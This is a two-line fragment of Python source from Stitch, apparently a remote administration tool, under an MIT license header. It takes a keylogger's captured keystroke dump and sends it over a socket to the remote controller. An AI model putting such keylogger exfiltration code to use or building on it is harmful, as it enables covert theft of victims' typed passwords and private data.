# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

resp = "{}\n\n".format(nt_kl.get_dump())
send(client_socket,resp)
